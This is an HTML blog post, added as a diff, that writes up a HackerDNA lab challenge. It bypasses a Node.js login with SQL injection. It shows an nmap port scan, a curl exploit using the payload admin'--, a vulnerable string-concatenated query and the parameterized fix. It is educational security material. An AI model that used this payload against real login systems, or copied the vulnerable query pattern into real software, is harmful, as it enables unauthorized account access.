@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auth Bypass via SQL Injection | S.M.Zaidi Blog</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0e1a;
+            --bg2: #0f172a;
+            --card: #111827;
+            --border: #1e3a5f;
+            --accent: #00d4ff;
+            --accent2: #00ff88;
+            --red: #ff4444;
+            --text: #c9d1d9;
+            --muted: #6b7280;
+            --mono: 'Share Tech Mono', monospace;
+            --display: 'Orbitron', sans-serif;
+            --body: 'Rajdhani', sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--body);
+            font-size: 1.05rem;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        /* Scanline overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0,212,255,0.015) 2px,
+                rgba(0,212,255,0.015) 4px
+            );
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* NAV */
+        nav {
+            background: rgba(10,14,26,0.95);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-logo {
+            font-family: var(--display);
+            font-size: 1.1rem;
+            color: var(--accent);
+            text-decoration: none;
+            letter-spacing: 2px;
+        }
+
+        .nav-logo span { color: var(--accent2); }
+
+        .nav-links a {
+            color: var(--muted);
+            text-decoration: none;
+            margin-left: 24px;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover { color: var(--accent); }
+
+        /* MAIN */
+        main {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 60px 24px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* BACK LINK */
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--muted);
+            text-decoration: none;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            margin-bottom: 40px;
+            transition: color 0.2s;
+        }
+        .back-link:hover { color: var(--accent); }
+
+        /* ARTICLE HEADER */
+        .article-header {
+            margin-bottom: 48px;
+            border-left: 3px solid var(--accent);
+            padding-left: 24px;
+        }
+
+        .tag-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+
+        .tag {
+            font-family: var(--mono);
+            font-size: 0.75rem;
+            padding: 3px 10px;
+            border-radius: 3px;
+            border: 1px solid;
+        }
+
+        .tag-red { color: var(--red); border-color: var(--red); background: rgba(255,68,68,0.1); }
+        .tag-blue { color: var(--accent); border-color: var(--accent); background: rgba(0,212,255,0.1); }
+        .tag-green { color: var(--accent2); border-color: var(--accent2); background: rgba(0,255,136,0.1); }
+
+        h1 {
+            font-family: var(--display);
+            font-size: 2rem;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1.3;
+            margin-bottom: 16px;
+            letter-spacing: 1px;
+        }
+
+        .article-meta {
+            font-family: var(--mono);
+            font-size: 0.8rem;
+            color: var(--muted);
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .article-meta span { color: var(--accent); }
+
+        /* SUMMARY BOX */
+        .summary-box {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent2);
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 40px;
+            font-family: var(--mono);
+            font-size: 0.9rem;
+        }
+
+        .summary-box .label {
+            color: var(--accent2);
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+        }
+
+        .summary-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-top: 12px;
+        }
+
+        .summary-item { display: flex; flex-direction: column; gap: 4px; }
+        .summary-item .key { color: var(--muted); font-size: 0.75rem; }
+        .summary-item .val { color: #fff; font-size: 0.9rem; }
+
+        /* SECTIONS */
+        h2 {
+            font-family: var(--display);
+            font-size: 1.1rem;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin: 48px 0 20px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        h2::before {
+            content: '//';
+            color: var(--muted);
+            font-family: var(--mono);
+        }
+
+        h3 {
+            font-family: var(--body);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e2e8f0;
+            margin: 24px 0 10px;
+        }
+
+        p { margin-bottom: 16px; color: var(--text); }
+
+        /* CODE BLOCKS */
+        .code-block {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .code-header {
+            background: #161b22;
+            padding: 8px 16px;
+            font-family: var(--mono);
+            font-size: 0.75rem;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .code-header .lang { color: var(--accent); }
+
+        .code-block pre {
+            padding: 20px;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            line-height: 1.7;
+            overflow-x: auto;
+            color: #e6edf3;
+        }
+
+        .code-block pre .cmd { color: var(--accent2); }
+        .code-block pre .flag { color: var(--red); }
+        .code-block pre .comment { color: var(--muted); }
+        .code-block pre .string { color: #f97316; }
+        .code-block pre .key { color: var(--accent); }
+
+        /* TERMINAL BLOCK */
+        .terminal {
+            background: #0d1117;
+            border: 1px solid #2d4a2d;
+            border-radius: 8px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            background: #161b22;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #2d4a2d;
+        }
+
+        .dot { width: 10px; height: 10px; border-radius: 50%; }
+        .dot-red { background: #ff5f57; }
+        .dot-yellow { background: #febc2e; }
+        .dot-green { background: #28c840; }
+
+        .terminal-title {
+            font-family: var(--mono);
+            font-size: 0.75rem;
+            color: var(--muted);
+            margin-left: 8px;
+        }
+
+        .terminal pre {
+            padding: 20px;
+            font-family: var(--mono);
+            font-size: 0.82rem;
+            line-height: 1.8;
+            color: var(--accent2);
+            overflow-x: auto;
+        }
+
+        .terminal pre .prompt { color: var(--muted); }
+        .terminal pre .output { color: #c9d1d9; }
+        .terminal pre .success { color: var(--accent2); }
+        .terminal pre .error { color: var(--red); }
+        .terminal pre .highlight { color: var(--accent); }
+
+        /* ALERT BOXES */
+        .alert {
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin: 20px 0;
+            font-size: 0.95rem;
+            border-left: 3px solid;
+        }
+
+        .alert-info {
+            background: rgba(0,212,255,0.07);
+            border-color: var(--accent);
+            color: #a8d8ea;
+        }
+
+        .alert-warning {
+            background: rgba(255,170,0,0.07);
+            border-color: #ffaa00;
+            color: #ffd580;
+        }
+
+        .alert-danger {
+            background: rgba(255,68,68,0.07);
+            border-color: var(--red);
+            color: #ffaaaa;
+        }
+
+        .alert-success {
+            background: rgba(0,255,136,0.07);
+            border-color: var(--accent2);
+            color: #aaffcc;
+        }
+
+        /* STEP INDICATOR */
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin: 24px 0;
+        }
+
+        .step {
+            display: flex;
+            gap: 20px;
+            position: relative;
+        }
+
+        .step:not(:last-child)::before {
+            content: '';
+            position: absolute;
+            left: 15px;
+            top: 32px;
+            bottom: -8px;
+            width: 1px;
+            background: var(--border);
+        }
+
+        .step-num {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--card);
+            border: 1px solid var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--mono);
+            font-size: 0.8rem;
+            color: var(--accent);
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .step-content { padding-bottom: 28px; }
+        .step-content h4 { color: #fff; font-size: 1rem; margin-bottom: 6px; }
+        .step-content p { color: var(--muted); font-size: 0.9rem; margin: 0; }
+
+        /* VULNERABILITY CARD */
+        .vuln-card {
+            background: var(--card);
+            border: 1px solid var(--red);
+            border-radius: 8px;
+            padding: 24px;
+            margin: 20px 0;
+        }
+
+        .vuln-card .vuln-title {
+            font-family: var(--display);
+            font-size: 0.9rem;
+            color: var(--red);
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+        }
+
+        /* KEY LEARNING */
+        .learning-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
+            margin: 20px 0;
+        }
+
+        .learning-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            transition: border-color 0.2s;
+        }
+
+        .learning-card:hover { border-color: var(--accent); }
+
+        .learning-card .icon {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+
+        .learning-card h4 {
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            color: var(--accent);
+            margin-bottom: 8px;
+        }
+
+        .learning-card p {
+            font-size: 0.88rem;
+            color: var(--muted);
+            margin: 0;
+        }
+
+        /* FOOTER */
+        footer {
+            border-top: 1px solid var(--border);
+            padding: 40px 24px;
+            text-align: center;
+            font-family: var(--mono);
+            font-size: 0.8rem;
+            color: var(--muted);
+            position: relative;
+            z-index: 1;
+        }
+
+        footer a { color: var(--accent); text-decoration: none; }
+
+        /* INLINE CODE */
+        code {
+            font-family: var(--mono);
+            background: #161b22;
+            border: 1px solid var(--border);
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            color: var(--accent);
+        }
+
+        @media (max-width: 600px) {
+            h1 { font-size: 1.4rem; }
+            nav { padding: 14px 20px; }
+            .nav-links { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <a href="https://mujtaba11riu.github.io/Portfolio1.1/" class="nav-logo">S.M.<span>Zaidi</span></a>
+    <div class="nav-links">
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/">Home</a>
+        <a href="#">Blog</a>
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#contact">Contact</a>
+    </div>
+</nav>
+
+<main>
+
+    <a href="#" class="back-link">← Back to Blog</a>
+
+    <header class="article-header">
+        <div class="tag-row">
+            <span class="tag tag-red">SQL Injection</span>
+            <span class="tag tag-blue">Auth Bypass</span>
+            <span class="tag tag-green">HackerDNA Lab</span>
+        </div>
+        <h1>Auth Bypass via SQL Injection</h1>
+        <div class="article-meta">
+            <div>By <span>Syed Mujtaba Zaidi</span></div>
+            <div>Feb 18, 2026</div>
+            <div>Platform: <span>HackerDNA</span></div>
+            <div>Difficulty: <span>Junior</span></div>
+        </div>
+    </header>
+
+    <!-- SUMMARY -->
+    <div class="summary-box">
+        <div class="label">// Challenge Summary</div>
+        <p style="color:#c9d1d9; margin:0 0 12px;">A classic SQL injection authentication bypass on an enterprise login portal running Node.js/Express on a non-standard port discovered via Nmap scanning.</p>
+        <div class="summary-grid">
+            <div class="summary-item"><span class="key">Target</span><span class="val">63.32.98.247</span></div>
+            <div class="summary-item"><span class="key">Service Port</span><span class="val">8080 (Node.js)</span></div>
+            <div class="summary-item"><span class="key">Vulnerability</span><span class="val">SQL Injection</span></div>
+            <div class="summary-item"><span class="key">Tools Used</span><span class="val">nmap, curl, gobuster</span></div>
+        </div>
+    </div>
+
+    <!-- METHODOLOGY -->
+    <h2>Methodology</h2>
+
+    <div class="steps">
+        <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+                <h4>Port Discovery</h4>
+                <p>Main page on port 80 was just a static challenge page. Ran full port scan to find the real service.</p>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+                <h4>Service Enumeration</h4>
+                <p>Discovered port 8080 running Node.js/Express — the actual authentication system.</p>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+                <h4>Login Form Analysis</h4>
+                <p>Port 8080 revealed an enterprise login form POSTing to /login endpoint.</p>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+                <h4>SQL Injection</h4>
+                <p>Tested the username field with classic payloads — authentication bypassed successfully.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- RECON -->
+    <h2>Reconnaissance</h2>
+
+    <p>The challenge page only showed a static landing page on port 80 with no useful attack surface. The hint said to <em>"find the authentication service located on this network"</em> — this meant port scanning was required.</p>
+
+    <div class="code-block">
+        <div class="code-header"><span class="lang">bash</span><span>nmap scan</span></div>
+        <pre><span class="cmd">nmap -sV -p- --min-rate 5000 63.32.98.247</span></pre>
+    </div>
+
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-green"></div>
+            <span class="terminal-title">kali@terminal</span>
+        </div>
+        <pre><span class="output">PORT     STATE SERVICE VERSION
+</span><span class="highlight">80/tcp   open  http    nginx 1.26.3</span>
+<span class="success">8080/tcp open  http    Node.js (Express middleware)</span></pre>
+    </div>
+
+    <p>Port 8080 was the target — a Node.js/Express application running the authentication service.</p>
+
+    <!-- ENUMERATION -->
+    <h2>Enumeration</h2>
+
+    <p>Visiting <code>http://63.32.98.247:8080/</code> revealed a standard enterprise login form with username and password fields, submitting credentials via POST to <code>/login</code>.</p>
+
+    <p>First I tested default credentials:</p>
+
+    <div class="code-block">
+        <div class="code-header"><span class="lang">bash</span><span>default creds test</span></div>
+        <pre><span class="cmd">curl -X POST http://63.32.98.247:8080/login \
+  -d "username=admin&password=admin"</span></pre>
+    </div>
+
+    <div class="alert alert-danger">
+        ✗ Authentication failed. Invalid username or password.
+    </div>
+
+    <p>Default credentials did not work. Moving on to SQL injection testing.</p>
+
+    <!-- EXPLOITATION -->
+    <h2>Exploitation</h2>
+
+    <p>The login form was a prime candidate for SQL injection. The classic payload to bypass authentication is:</p>
+
+    <div class="code-block">
+        <div class="code-header"><span class="lang">sql</span><span>injection payload logic</span></div>
+        <pre><span class="comment">-- Normal query the app runs:</span>
+SELECT * FROM users WHERE username=<span class="string">'INPUT'</span> AND password=<span class="string">'INPUT'</span>
+
+<span class="comment">-- With payload  admin'--  the query becomes:</span>
+SELECT * FROM users WHERE username=<span class="string">'admin'</span><span class="flag">--</span><span class="string">'</span> AND password=<span class="string">'...'</span>
+
+<span class="comment">-- Everything after -- is a comment, password check is ignored!</span></pre>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header"><span class="lang">bash</span><span>exploit</span></div>
+        <pre><span class="cmd">curl -X POST http://63.32.98.247:8080/login \
+  -d <span class="string">"username=admin'--&password=anything"</span></span></pre>
+    </div>
+
+    <div class="alert alert-success">
+        ✓ Authentication Successful! Welcome, admin!
+    </div>
+
+    <!-- VULNERABILITY -->
+    <h2>Vulnerability Analysis</h2>
+
+    <div class="vuln-card">
+        <div class="vuln-title">⚠ OWASP A03:2021 — SQL Injection</div>
+        <p style="margin:0; color:#c9d1d9; font-size:0.95rem;">The application directly concatenated user-supplied input into SQL queries without sanitization or parameterization. This is one of the most well-known and dangerous vulnerabilities in web security.</p>
+    </div>
+
+    <h3>Vulnerable Code Pattern</h3>
+    <div class="code-block">
+        <div class="code-header"><span class="lang">javascript</span><span>vulnerable code (example)</span></div>
+        <pre><span class="comment">// ❌ VULNERABLE — string concatenation</span>
+const query = <span class="string">`SELECT * FROM users WHERE username='${username}' AND password='${password}'`</span>;</pre>
+    </div>
+
+    <h3>Secure Code Pattern</h3>
+    <div class="code-block">
+        <div class="code-header"><span class="lang">javascript</span><span>secure code</span></div>
+        <pre><span class="comment">// ✅ SECURE — parameterized query</span>
+const query = <span class="string">'SELECT * FROM users WHERE username=? AND password=?'</span>;
+db.execute(query, [username, password]);</pre>
+    </div>
+
+    <!-- KEY LEARNINGS -->
+    <h2>Key Learnings</h2>
+
+    <div class="learning-grid">
+        <div class="learning-card">
+            <div class="icon">🔍</div>
+            <h4>Port Scanning First</h4>
+            <p>Always scan all ports — services often run on non-standard ports like 8080, 8443, 3000.</p>
+        </div>
+        <div class="learning-card">
+            <div class="icon">💉</div>
+            <h4>Test Input Fields</h4>
+            <p>Every login form should be tested for SQL injection before trying other techniques.</p>
+        </div>
+        <div class="learning-card">
+            <div class="icon">🛡️</div>
+            <h4>Use Parameterized Queries</h4>
+            <p>Prepared statements completely prevent SQL injection regardless of input.</p>
+        </div>
+        <div class="learning-card">
+            <div class="icon">🧠</div>
+            <h4>Understand the SQL Logic</h4>
+            <p>Understanding how the query breaks helps craft better payloads and explain fixes.</p>
+        </div>
+    </div>
+
+    <div class="alert alert-info">
+        🔗 <strong>Lab Link:</strong> <a href="http://63.32.98.247/" style="color:var(--accent);">http://63.32.98.247/</a> — HackerDNA Auth Bypass Challenge
+    </div>
+
+</main>
+
+<footer>
+    <p>Written by <a href="https://mujtaba11riu.github.io/Portfolio1.1/">Syed Mujtaba Zaidi</a> · Penetration Tester & CTF Player</p>
+    <p style="margin-top:8px; color:#374151;">Educational purposes only. Always hack ethically and legally.</p>
+</footer>
+
+</body>
+</html>
